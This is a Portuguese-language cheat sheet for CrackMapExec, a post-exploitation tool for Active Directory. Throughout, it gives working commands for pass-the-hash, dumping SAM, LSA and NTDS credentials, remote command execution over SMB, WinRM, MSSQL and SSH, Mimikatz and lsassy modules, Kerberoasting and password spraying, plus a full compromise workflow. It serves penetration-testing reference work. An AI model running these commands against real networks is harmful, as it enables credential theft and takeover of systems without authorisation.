# 🗡️ CrackMapExec — ferramenta multifunções para AD

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

> **Nota de versão:** os comandos cme/crackmapexec do original foram mantidos como referência histórica. A continuação comunitária é NetExec, cujo executável é nxc; opções, módulos, pacotes e suporte por protocolo não são necessariamente idênticos. Confirme a documentação da versão usada em vez de substituir apenas o nome do comando. [Projeto NetExec e história do projeto](https://github.com/Pennyw0rth/NetExec). Password spraying testa uma palavra-passe em várias contas e pode provocar bloqueios; um indicador de sucesso deve ser interpretado no contexto do protocolo e das permissões verificadas.

[🇮🇹 Versione Italiana](README.it.md) | [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   ██████╗███╗   ███╗███████╗
  ██╔════╝████╗ ████║██╔════╝
  ██║     ██╔████╔██║█████╗  
  ██║     ██║╚██╔╝██║██╔══╝  
  ╚██████╗██║ ╚═╝ ██║███████╗
   ╚═════╝╚═╝     ╚═╝╚══════╝
   CrackMapExec — ferramenta multifunções para testes de intrusão
```

<p align="center">
  <img src="https://img.shields.io/badge/CrackMapExec-Active_Directory-red?style=for-the-badge" alt="CME">
  <img src="https://img.shields.io/badge/SMB-blue?style=for-the-badge" alt="SMB">
  <img src="https://img.shields.io/badge/WinRM-green?style=for-the-badge" alt="WinRM">
</p>

---

## 📋 Índice

- [O que é o CrackMapExec](#-what-is-crackmapexec)
- [Instalação](#-installation)
- [Protocolo SMB](#-smb-protocol)
- [Protocolo WinRM](#-winrm-protocol)
- [Protocolo LDAP](#-ldap-protocol)
- [Protocolo MSSQL](#-mssql-protocol)
- [Protocolo SSH](#-ssh-protocol)
- [Módulos](#-modules)
- [Password spraying](#-password-spraying)
- [Referência rápida](#-quick-reference)

---

<a id="-what-is-crackmapexec"></a>
## 🎯 O que é o CrackMapExec

O **CrackMapExec** (CME) é uma ferramenta de pós-exploração para avaliações de redes. Suporta:

- 🖥️ **SMB** — Partilhas, sessões e execução
- 🔧 **WinRM** — Comunicação remota com PowerShell
- 📂 **LDAP** — Enumeração de AD
- 🗄️ **MSSQL** — Ataques a SQL Server
- 🐧 **SSH** — Alvos Linux
- 💉 **Pass-the-Hash** — Reutilização de credenciais

### Funcionalidades

| Funcionalidade | Descrição |
|---------|-------------|
| **Vários protocolos** | SMB, WinRM, LDAP, MSSQL, SSH |
| **Execução em paralelo** | Atacar vários alvos |
| **Base de dados de credenciais** | Registar credenciais comprometidas |
| **Módulos** | Extensível através de módulos personalizados |
| **Formatos de saída** | Várias opções de saída |

---

<a id="-installation"></a>
## 🚀 Instalação

### Kali Linux

```bash
# Instalar através de apt
sudo apt update
sudo apt install crackmapexec

# Ou através de pipx (recomendado)
pipx install crackmapexec
```

### Com pipx

```bash
# Instalar primeiro pipx
sudo apt install pipx
pipx ensurepath

# Instalar CME
pipx install crackmapexec
```

### Verificar

```bash
crackmapexec --help
crackmapexec smb --help
```

---

<a id="-smb-protocol"></a>
## 🖥️ Protocolo SMB

### Enumeração básica

```bash
# Verificar se os sistemas estão ativos
cme smb 10.10.10.0/24

# Enumerar com credenciais
cme smb 10.10.10.10 -u user -p password

# Autenticação do domínio
cme smb 10.10.10.10 -u user -p password -d domain.local

# Autenticação local
cme smb 10.10.10.10 -u administrator -p password --local-auth
```

### Pass-the-Hash

```bash
# SMB com hash NTLM
cme smb 10.10.10.10 -u user -H NTLMHASH

# Hash LM:NTLM completo
cme smb 10.10.10.10 -u user -H LM:NTLM

# Testar o hash em vários sistemas da rede
cme smb 10.10.10.0/24 -u administrator -H NTLMHASH --local-auth
```

### Enumeração de partilhas

```bash
# Listar partilhas
cme smb 10.10.10.10 -u user -p password --shares

# Percorrer partilhas à procura de ficheiros
cme smb 10.10.10.10 -u user -p password --spider C$ --pattern txt

# Listar ficheiros de forma recursiva
cme smb 10.10.10.10 -u user -p password --spider-folder /path --depth 3
```

### Enumeração de utilizadores

```bash
# Listar utilizadores através de RPC
cme smb 10.10.10.10 -u user -p password --users

# Listar grupos
cme smb 10.10.10.10 -u user -p password --groups

# Listar utilizadores com sessão iniciada
cme smb 10.10.10.10 -u user -p password --loggedon-users

# Obter os SIDs dos utilizadores
cme smb 10.10.10.10 -u user -p password --rid-brute
```

### Execução de comandos

```bash
# Executar um comando
cme smb 10.10.10.10 -u admin -p password -x "whoami"

# Execução PowerShell
cme smb 10.10.10.10 -u admin -p password -X "Get-Process"

# Métodos de execução diferentes
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method smbexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method wmiexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method atexec
cme smb 10.10.10.10 -u admin -p password -x "whoami" --exec-method mmcexec
```

### Extração de credenciais

```bash
# Extrair SAM
cme smb 10.10.10.10 -u admin -p password --sam

# Extrair LSA
cme smb 10.10.10.10 -u admin -p password --lsa

# Extrair NTDS.dit (exige privilégios de administrador do domínio no controlador)
cme smb DC01.domain.local -u admin -p password --ntds

# Extrair NTDS através de um método específico
cme smb DC01 -u admin -p password --ntds drsuapi
cme smb DC01 -u admin -p password --ntds vss
```

### Assinatura SMB

```bash
# Verificar a assinatura SMB (para ataques de relay)
cme smb 10.10.10.0/24 --gen-relay-list relay.txt
```

---

<a id="-winrm-protocol"></a>
## 🔧 Protocolo WinRM

### Utilização básica

```bash
# Verificar o acesso WinRM
cme winrm 10.10.10.10 -u user -p password

# Verificar vários alvos
cme winrm 10.10.10.0/24 -u user -p password

# Com hash
cme winrm 10.10.10.10 -u user -H NTLMHASH
```

### Execução de comandos

```bash
# Executar um comando
cme winrm 10.10.10.10 -u admin -p password -x "whoami"

# PowerShell
cme winrm 10.10.10.10 -u admin -p password -X "Get-Process"

# Executar um script
cme winrm 10.10.10.10 -u admin -p password -X '$PSVersionTable'
```

### Extração de credenciais

```bash
# Extração de SAM através de WinRM
cme winrm 10.10.10.10 -u admin -p password --sam

# Segredos LSA
cme winrm 10.10.10.10 -u admin -p password --lsa
```

---

<a id="-ldap-protocol"></a>
## 📂 Protocolo LDAP

### Enumeração

```bash
# Consulta LDAP básica
cme ldap DC01.domain.local -u user -p password

# Listar utilizadores
cme ldap DC01 -u user -p password --users

# Listar grupos
cme ldap DC01 -u user -p password --groups

# Utilizadores suscetíveis a AS-REP roasting
cme ldap DC01 -u user -p password --asreproast asrep.txt

# Utilizadores suscetíveis a Kerberoasting
cme ldap DC01 -u user -p password --kerberoasting kerb.txt
```

### Política de palavras-passe

```bash
# Obter a política de palavras-passe
cme ldap DC01 -u user -p password --password-policy
```

### Atributos dos utilizadores

```bash
# Obter as descrições dos utilizadores
cme ldap DC01 -u user -p password -M get-desc-users

# Obter atributos específicos
cme ldap DC01 -u user -p password --admin-count
```

---

<a id="-mssql-protocol"></a>
## 🗄️ Protocolo MSSQL

### Utilização básica

```bash
# Ligar a MSSQL
cme mssql 10.10.10.10 -u sa -p password

# Autenticação Windows
cme mssql 10.10.10.10 -u user -p password -d domain.local

# Com hash
cme mssql 10.10.10.10 -u user -H NTLMHASH -d domain.local
```

### Execução de comandos

```bash
# Executar através de xp_cmdshell
cme mssql 10.10.10.10 -u sa -p password -x "whoami"

# Ativar primeiro xp_cmdshell
cme mssql 10.10.10.10 -u sa -p password --enable-xp

# Executar um comando
cme mssql 10.10.10.10 -u sa -p password -q "SELECT @@version"
```

---

<a id="-ssh-protocol"></a>
## 🐧 Protocolo SSH

### Utilização básica

```bash
# Verificação de SSH
cme ssh 10.10.10.10 -u root -p password

# Vários alvos
cme ssh 10.10.10.0/24 -u user -p password

# Com um ficheiro de chave
cme ssh 10.10.10.10 -u user --key-file id_rsa
```

### Execução de comandos

```bash
# Executar um comando
cme ssh 10.10.10.10 -u root -p password -x "id"

# Vários comandos
cme ssh 10.10.10.10 -u root -p password -x "cat /etc/passwd"
```

---

<a id="-modules"></a>
## 🧩 Módulos

### Listar módulos

```bash
# Listar todos os módulos
cme smb -L
cme winrm -L
cme ldap -L

# Ajuda do módulo
cme smb -M mimikatz --options
```

### Módulos populares

```bash
# Mimikatz
cme smb 10.10.10.10 -u admin -p password -M mimikatz

# Lsassy (extrair dados de LSASS)
cme smb 10.10.10.10 -u admin -p password -M lsassy

# WebDAV
cme smb 10.10.10.10 -u admin -p password -M webdav

# Petitpotam
cme smb 10.10.10.10 -u user -p password -M petitpotam

# Palavras-passe de GPP
cme smb DC01 -u user -p password -M gpp_password

# Início de sessão automático de GPP
cme smb DC01 -u user -p password -M gpp_autologin

# Spider Plus
cme smb 10.10.10.10 -u user -p password -M spider_plus
```

### Recolha para BloodHound

```bash
# Recolher dados para BloodHound
cme ldap DC01 -u user -p password --bloodhound -ns DC01 -c All
```

---

<a id="-password-spraying"></a>
## 🔓 Password spraying

### Password spraying básico

```bash
# Testar uma palavra-passe contra vários utilizadores
cme smb 10.10.10.10 -u users.txt -p 'Password123!' --continue-on-success

# Várias palavras-passe
cme smb 10.10.10.10 -u users.txt -p passwords.txt --continue-on-success

# Não testar por força bruta todas as combinações
cme smb 10.10.10.10 -u users.txt -p passwords.txt --no-bruteforce
```

### Password spraying na rede

```bash
# Testar a palavra-passe em vários sistemas da rede
cme smb 10.10.10.0/24 -u user -p 'Password123!' --continue-on-success

# A partir de um ficheiro de alvos
cme smb targets.txt -u admin -p password --continue-on-success
```

### Ter em conta o bloqueio de contas

```bash
# Verificar primeiro a política de palavras-passe
cme ldap DC01 -u user -p password --password-policy

# Saída:
# Comprimento mínimo da palavra-passe: 8
# Número de palavras-passe no histórico: 24
# Limiar de bloqueio: 5
# Duração do bloqueio: 30 minutos
```

---

## 💾 Base de dados

### Base de dados do CME

```bash
# Consultar credenciais
cmedb

# Dentro de cmedb:
creds           # Listar as credenciais guardadas
hosts           # Listar os sistemas analisados
```

### Exportar dados

```bash
# Formatos de saída
cme smb 10.10.10.10 -u user -p password --log log.txt

# Saída JSON
cme smb 10.10.10.10 -u user -p password --json
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Métodos de autenticação

| Método | Opção |
|--------|--------|
| Palavra-passe | `-p password` |
| Hash NTLM | `-H HASH` |
| Chave AES | `--aesKey KEY` |
| Kerberos | `-k` |
| Autenticação local | `--local-auth` |

### Protocolos

| Protocolo | Porta | Caso de utilização |
|----------|------|----------|
| SMB | 445 | Partilhas de ficheiros e execução |
| WinRM | 5985/5986 | Comunicação remota com PowerShell |
| LDAP | 389/636 | Enumeração de AD |
| MSSQL | 1433 | SQL Server |
| SSH | 22 | Sistemas Linux |

### Opções comuns

| Opção | Descrição |
|------|-------------|
| `-u` | Nome de utilizador (ou ficheiro) |
| `-p` | Palavra-passe (ou ficheiro) |
| `-H` | Hash NTLM |
| `-d` | Domínio |
| `-x` | Comando (CMD) |
| `-X` | Comando (PowerShell) |
| `--shares` | Listar partilhas |
| `--users` | Listar utilizadores |
| `--sam` | Extrair SAM |
| `--lsa` | Extrair LSA |
| `--ntds` | Extrair NTDS |

### Indicadores da saída

| Indicador | Significado |
|--------|---------|
| `[+]` | Sucesso |
| `[-]` | Falha |
| `[*]` | Informação |
| `(Pwn3d!)` | Acesso de administrador confirmado |

### Fluxo de trabalho habitual

```bash
# 1. Analisar a rede
cme smb 10.10.10.0/24

# 2. Testar uma palavra-passe em várias contas
cme smb 10.10.10.0/24 -u users.txt -p 'Summer2024!' --continue-on-success

# 3. Verificar o acesso de administrador
cme smb 10.10.10.0/24 -u user -p password

# 4. Extrair credenciais
cme smb 10.10.10.10 -u admin -p password --sam --lsa

# 5. Utilizar as credenciais encontradas
cme smb 10.10.10.0/24 -u newuser -H NEWHASH
```

---

## 📚 Recursos

- [CrackMapExec GitHub](https://github.com/Porchetta-Industries/CrackMapExec)
- [CrackMapExec Wiki](https://wiki.porchetta.industries/)
- [CME Modules](https://github.com/Porchetta-Industries/CrackMapExec/tree/master/cme/modules)

### Guias de referência relacionados
- [BloodHound](../../BloodHound/translations/README.pt.md)
- [Impacket](../../Impacket/translations/README.pt.md)
- [Mimikatz](../../Mimikatz/translations/README.pt.md)

---

<p align="center">
  <b>🗡️ Obtenha o controlo da rede!</b><br>
  <i>CrackMapExec — ferramenta multifunções para testes de intrusão</i>
</p>
